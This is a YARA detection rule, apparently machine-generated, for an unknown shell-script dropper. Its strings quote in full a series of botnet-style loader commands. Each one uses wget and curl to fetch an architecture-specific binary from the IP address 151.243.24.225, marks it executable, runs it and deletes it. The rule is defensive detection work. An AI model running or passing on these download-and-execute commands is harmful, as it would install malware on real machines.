rule SCRIPT_Dropper_Unknown_ForgeAuto_4a79e943
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "4a79e943eb94f1951759a9e8a7d61807b1eb0874c13e6b6a6760db4a403b7d36"
        yarahub_uuid = "06ab5a21-c1ec-4acd-927e-9bb3ec815936"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "aa104e1726019d22ffc8c5e5abf849bd"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "/bin/bash" ascii
        $s1 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm; curl -O http://151.243.24.225/0uparm; chmod +x 0uparm; ./0uparm ok; rm -rf 0uparm; rm -rf 0uparm.1" ascii
        $s2 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm5; curl -O http://151.243.24.225/0uparm5; chmod +x 0uparm5; ./0uparm5 ok; rm -rf 0uparm5; rm -rf 0uparm5.1" ascii
        $s3 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm6; curl -O http://151.243.24.225/0uparm6; chmod +x 0uparm6; ./0uparm6 ok; rm -rf 0uparm6; rm -rf 0uparm6.1" ascii
        $s4 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm7; curl -O http://151.243.24.225/0uparm7; chmod +x 0uparm7; ./0uparm7 ok; rm -rf 0uparm7; rm -rf 0uparm7.1" ascii
        $s5 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upm68k; curl -O http://151.243.24.225/0upm68k; chmod +x 0upm68k; ./0upm68k ok; rm -rf 0upm68k; rm -rf 0upm68k.1" ascii
        $s6 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upmips; curl -O http://151.243.24.225/0upmips; chmod +x 0upmips; ./0upmips ok; rm -rf 0upmips; rm -rf 0upmips.1" ascii
        $s7 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upmpsl; curl -O http://151.243.24.225/0upmpsl; chmod +x 0upmpsl; ./0upmpsl ok; rm -rf 0upmpsl; rm -rf 0upmpsl.1" ascii
        $s8 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upppc; curl -O http://151.243.24.225/0upppc; chmod +x 0upppc; ./0upppc ok; rm -rf 0upppc; rm -rf 0upppc.1" ascii
        $s9 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upsh4; curl -O http://151.243.24.225/0upsh4; chmod +x 0upsh4; ./0upsh4 ok; rm -rf 0upsh4; rm -rf 0upsh4.1" ascii
        $s10 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upspc; curl -O http://151.243.24.225/0upspc; chmod +x 0upspc; ./0upspc ok; rm -rf 0upspc; rm -rf 0upspc.1" ascii
        $s11 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upx64; curl -O http://151.243.24.225/0upx64; chmod +x 0upx64; ./0upx64 ok; rm -rf 0upx64; rm -rf 0upx64.1" ascii
        $s12 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upx86; curl -O http://151.243.24.225/0upx86; chmod +x 0upx86; ./0upx86 ok; rm -rf 0upx86; rm -rf 0upx86.1" ascii
    condition:
        true and filesize < 50MB and 2 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
